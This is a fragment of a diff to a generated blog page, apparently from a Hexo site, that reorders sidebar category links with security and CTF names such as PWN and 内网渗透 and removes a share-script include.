         <span class="sidebar-tag-name" data-tags="pwn,堆,glibc"><span class="iconfont-archer">&#xe606;</span>pwn,堆,glibc</span>
     
@@ -1606,15 +1401,13 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
         <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
-        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
-    
-        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
     
         <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
@@ -1623,6 +1416,8 @@ jsonContent:
         <span class="sidebar-category-name" data-categories="Pwn"><span class="iconfont-archer">&#xe60a;</span>Pwn</span>
     
         <span class="sidebar-category-name" data-categories="BlackHatTools"><span class="iconfont-archer">&#xe60a;</span>BlackHatTools</span>
+    
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
@@ -1658,8 +1453,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
